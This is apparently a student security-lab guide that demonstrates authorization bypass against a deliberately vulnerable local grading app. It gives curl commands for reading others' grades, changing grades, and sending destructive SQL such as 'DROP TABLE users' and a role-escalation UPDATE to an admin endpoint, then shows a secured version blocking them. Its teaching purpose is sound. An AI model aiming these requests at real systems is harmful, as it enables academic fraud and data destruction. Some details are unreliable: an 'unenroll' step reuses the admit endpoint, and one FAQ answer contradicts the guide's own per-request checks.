# Authorization Bypass - Complete Attack Demonstrations with curl Commands

## Executive Summary

This document provides all possible **Authorization Bypass attacks** that can be demonstrated against the VULNERABLE version, with exact curl commands for reproducibility before professors.

---

## Setup Instructions

### Terminal 1: Start Vulnerable Server
```bash
cd "Authorization Bypass"
python3 -m uvicorn app_vulnerable:app --host 0.0.0.0 --port 8001 --reload
```

### Terminal 2: Start Secure Server (for comparison)
```bash
cd "Authorization Bypass"
python3 -m uvicorn app_secure:app --host 0.0.0.0 --port 8002 --reload
```

### Terminal 3: Run Attack Commands

---

## Attack Category 1: Privacy Breach - Access Other Students' Data

### Attack 1.1: Student Views Another Student's Grades

**Vulnerability:** No verification that student is viewing their own grades.

**Curl Command:**
```bash
curl -X POST http://localhost:8001/api/student/view-grades \
  -H "Content-Type: application/json" \
  -d '{
    "student_username": "other_student"
  }'
```

**Expected VULNERABLE Response (200 OK):**
```json
{
  "grades": [
    {"course": "CS101", "grade": "A"},
    {"course": "MA201", "grade": "B+"},
    {"course": "CS205", "grade": "A-"}
  ]
}
```

**Why This Is Bad:** 
- Student "John" can view grades of student "Sarah" without permission
- Privacy violation (FERPA/legal issue)
- No authentication check on WHO is requesting the data

**What Faculty Should See:**
- Any authenticated user can access ANY student's grades
- No role validation
- No data ownership verification

---

## Attack Category 2: Privilege Escalation - Students Acting As Instructors

### Attack 2.1: Student Admits Another Student to Course

**Vulnerability:** No role check on instructor-only endpoint.

**Curl Command:**
```bash
curl -X POST http://localhost:8001/api/instructor/admit-student \
  -H "Content-Type: application/json" \
  -d '{
    "student_username": "target_student",
    "course_code": "CS101"
  }'
```

**Expected VULNERABLE Response (200 OK):**
```json
{
  "message": "Instructor admitted target_student to CS101."
}
```

**Why This Is Bad:**
- A regular student can perform instructor privileges
- Unauthorized course enrollment manipulation
- Violates role-based access control (RBAC)

**Example Attack Scenario:**
- Attacker (student) adds themselves or friends to courses before drop deadline
- Creates unfair course loads for other students

---

### Attack 2.2: Student Assigns Grades to Another Student

**Vulnerability:** NO ROLE CHECK - Any authenticated user can modify grades.

**Curl Command:**
```bash
curl -X POST http://localhost:8001/api/instructor/assign-grade \
  -H "Content-Type: application/json" \
  -d '{
    "student_username": "target_student",
    "course_code": "CS101",
    "grade": "F"
  }'
```

**Expected VULNERABLE Response (200 OK):**
```json
{
  "message": "Grade F assigned to target_student for CS101."
}
```

**Advanced Attack Variants:**

*Change own grade to A:*
```bash
curl -X POST http://localhost:8001/api/instructor/assign-grade \
  -H "Content-Type: application/json" \
  -d '{
    "student_username": "my_username",
    "course_code": "CS101",
    "grade": "A"
  }'
```

*Give someone else an F:*
```bash
curl -X POST http://localhost:8001/api/instructor/assign-grade \
  -H "Content-Type: application/json" \
  -d '{
    "student_username": "rival_student",
    "course_code": "MA201",
    "grade": "F"
  }'
```

**Why This Is Critical:**
- Direct impact on academic records
- Grades affect GPA, scholarships, future opportunities
- Fraud/academic integrity violation

---

### Attack 2.3: Student Creates Assignment (Instructor-Only)

**Vulnerability:** No role verification on assignment creation.

**Curl Command:**
```bash
curl -X POST http://localhost:8001/api/instructor/create-assignment \
  -H "Content-Type: application/json" \
  -d '{
    "course_code": "CS101",
    "title": "Fake Assignment - Ignore This"
  }'
```

**Expected VULNERABLE Response (200 OK):**
```json
{
  "message": "Assignment 'Fake Assignment - Ignore This' created for CS101."
}
```

**Why This Is Bad:**
- Students can create fake assignments
- Confuse other students
- Instructor workflow disruption

---

## Attack Category 3: Administrative Abuse - Students Acting As Admins

### Attack 3.1: Student Executes Admin Actions

**Vulnerability:** Admin endpoint accessible to ANY authenticated user.

**Curl Command:**
```bash
curl -X POST http://localhost:8001/api/admin/action \
  -H "Content-Type: application/json" \
  -d '{
    "query": "SELECT * FROM users WHERE role=\"admin\""
  }'
```

**Expected VULNERABLE Response (200 OK):**
```json
{
  "message": "Admin action placeholder executed: SELECT * FROM users WHERE role=\"admin\""
}
```

**Variants - What Attackers Could Do:**

*Export all admin users:*
```bash
curl -X POST http://localhost:8001/api/admin/action \
  -H "Content-Type: application/json" \
  -d '{
    "query": "SELECT * FROM users WHERE role=\"admin\" OR role=\"instructor\""
  }'
```

*Try to modify system settings:*
```bash
curl -X POST http://localhost:8001/api/admin/action \
  -H "Content-Type: application/json" \
  -d '{
    "query": "UPDATE users SET role=\"admin\" WHERE username=\"attacker\""
  }'
```

*Attempt to drop tables (if endpoint executed queries):*
```bash
curl -X POST http://localhost:8001/api/admin/action \
  -H "Content-Type: application/json" \
  -d '{
    "query": "DROP TABLE users;"
  }'
```

**Why This Is Catastrophic:**
- System compromise
- Potential data theft
- Potential data deletion
- Complete loss of system integrity

---

## Attack Category 4: Combined Attacks - Full Privilege Escalation Chain

### Attack 4.1: Student Escalates Self to Admin

**Step 1:** Student assigns themselves an "admin" role
```bash
curl -X POST http://localhost:8001/api/admin/action \
  -H "Content-Type: application/json" \
  -d '{
    "query": "UPDATE users SET role=\"admin\" WHERE username=\"student_user\""
  }'
```

**Step 2:** Now student can execute all admin commands

---

### Attack 4.2: Sabotage Chain

**Step 1:** View grades to find top student
```bash
curl -X POST http://localhost:8001/api/student/view-grades \
  -H "Content-Type: application/json" \
  -d '{"student_username": "top_student"}'
```

**Step 2:** Give them failing grade
```bash
curl -X POST http://localhost:8001/api/instructor/assign-grade \
  -H "Content-Type: application/json" \
  -d '{
    "student_username": "top_student",
    "course_code": "CS101",
    "grade": "F"
  }'
```

**Step 3:** Remove their course enrollment
```bash
curl -X POST http://localhost:8001/api/instructor/admit-student \
  -H "Content-Type: application/json" \
  -d '{
    "student_username": "top_student",
    "course_code": "CS101"
  }'
```

---

## Comparison: Secure Version Blocks All Attacks

Once the server is running on port 8002, these same commands will be **BLOCKED**:

### Example: Attempting Same Attack on Secure Version

```bash
curl -X POST http://localhost:8002/api/student/view-grades \
  -H "Content-Type: application/json" \
  -H "X-User: student_user" \
  -H "X-Role: student" \
  -d '{
    "student_username": "other_student"
  }'
```

**Expected SECURE Response (403 Forbidden):**
```json
{
  "detail": "Access denied. Users can only view their own grades."
}
```

**Or if endpoint doesn't exist for that role (401):**
```json
{
  "detail": "Missing authentication headers (X-User, X-Role)"
}
```

---

## Demonstration Flow for Professors

### Part 1: Show Vulnerability (5 minutes)

1. **Run Attack 1.1** - Student views other student's grades
   - Show privacy breach

2. **Run Attack 2.2** - Student assigns failing grade
   - Show data integrity violation

3. **Run Attack 3.1** - Student executes admin commands
   - Show system compromise risk

### Part 2: Explain Impact (3 minutes)

| Impact | Severity |
|--------|----------|
| Privacy Violation | 🔴 Critical |
| Academic Fraud | 🔴 Critical |
| Data Integrity | 🔴 Critical |
| System Compromise | 🔴 Critical |
| Audit Trail Bypass | 🟠 High |
| Compliance Violation | 🟠 High |

### Part 3: Show Secure Version (3 minutes)

Run the same attacks against port 8002 and show they're all blocked.

### Part 4: Explain How We Fixed It (4 minutes)

**Three-Layer Defense:**

1. **Authentication Layer**
   - Verify user identity (username/password)
   - All tests in `test_authorization_bypass.py` verify this

2. **Authorization Layer**
   - Check user role for each endpoint
   - See decorators in `app_secure.py`

3. **Data Isolation Layer**
   - Verify request matches user's data
   - E.g., student can only view their own grades

---

## Automated Testing

Run all tests automatically:

```bash
python3 test_authorization_bypass.py --target vulnerable
python3 test_authorization_bypass.py --target secure
python3 test_authorization_bypass.py --target both
```

This will:
- ✅ Show all 4 attacks succeed on vulnerable version
- ❌ Show all attacks fail on secure version
- 📊 Generate visual report with color coding

---

## Key Talking Points for Professors

1. **"We found zero authorization checks in the original code"**
   - Show the vulnerable `app_vulnerable.py` - no decorators

2. **"This is why parameterized queries AND authorization checks are both needed"**
   - SQL injection prevention requires prepared statements
   - Authorization bypass prevention requires role checks

3. **"Role-based access control (RBAC) is foundational"**
   - Every endpoint must verify user role
   - Not just checking if user is logged in

4. **"Data ownership matters - checking WHO owns the data"**
   - Authentication: "Are you who you claim?"
   - Authorization: "Do you have permission?"
   - Data Isolation: "Is this YOUR data?"

5. **"These vulnerabilities are in real-world systems today"**
   - LinkedIn (2021): Could view others' profile data
   - Facebook (2019): Could modify friends' posts
   - Many university ERP systems are vulnerable

---

## All Curl Commands Quick Reference

| Attack | Command |
|--------|---------|
| View Other Grades | `curl -X POST http://localhost:8001/api/student/view-grades -H "Content-Type: application/json" -d '{"student_username": "other_student"}'` |
| Assign Grade | `curl -X POST http://localhost:8001/api/instructor/assign-grade -H "Content-Type: application/json" -d '{"student_username": "target", "course_code": "CS101", "grade": "F"}'` |
| Admit Student | `curl -X POST http://localhost:8001/api/instructor/admit-student -H "Content-Type: application/json" -d '{"student_username": "target", "course_code": "CS101"}'` |
| Create Assignment | `curl -X POST http://localhost:8001/api/instructor/create-assignment -H "Content-Type: application/json" -d '{"course_code": "CS101", "title": "Fake Assignment"}'` |
| Admin Action | `curl -X POST http://localhost:8001/api/admin/action -H "Content-Type: application/json" -d '{"query": "SELECT * FROM users"}'` |

---

## Questions Faculty Might Ask

**Q: Can students really just call any endpoint like that?**
A: Yes, because there's no role verification. Every endpoint should validate the user's role BEFORE processing.

**Q: What if we just check the database for the user's role?**
A: That's better than nothing, but still not best practice. Use JWT tokens or session tokens with role claims. Don't check on every request - trust your auth layer.

**Q: How do you prevent this in production?**
A: 
- Use middleware to enforce authorization
- Implement decorators like we did in `app_secure.py`
- Never skip role checks
- Always verify data ownership

**Q: Is HTTP header spoofing a risk in production?**
A: Yes, which is why production uses signed JWT tokens instead of custom headers. The principle remains the same.

